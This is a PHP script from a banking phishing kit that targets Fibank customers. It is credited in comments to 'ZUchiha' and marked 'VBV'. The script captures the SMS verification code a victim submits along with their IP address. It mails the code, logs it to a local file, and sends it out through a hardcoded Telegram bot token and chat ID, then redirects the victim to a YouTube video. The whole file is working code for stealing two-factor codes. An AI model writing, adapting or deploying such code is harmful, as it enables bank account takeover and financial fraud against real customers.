<?php
include 'email.php';
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * version 2.0
 * icq & telegram = @Fiddlerl
 
###############################################
#$            C0d3d by ZUchiha               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Fibank            $#
###############################################
**/
$sm = $_POST['sms'] ; 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
 
 
$subject = " SMS 2 :) <3 : from: ".$ip;
$nome=" VBV " ; 
	$from="resulta@localhost.com" ; 
	$from_mail = $nome.'<'.$from.'>';
$headers .= 'From: ' . $from_mail . "\r\n";

$message  = "------------------+ SMS Fibank  +-----------------\r\n";
$message .= "SMS: ".$sm."\r\n";
$message .= "---------------+ Host Infos +---------------\r\n";
$message .= "IP Address : ".$ip."\r\n";
$message .= "-----------------+ Created By ZUchiha +------------------\r\n";
mail($to,$subject,$from_mail,$message);
$sajal = fopen("../uchiha/sms2.txt", "a");  
fwrite($sajal, $message);

$token = "1854944421:AAGKQZbdHO8SbM3gXRRHo4LvUDEIchpIqnk";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-709142532&text=" . urlencode($message)."" );
header('Location: https://www.youtube.com/watch?v=H3dIpjyPqGA');


?>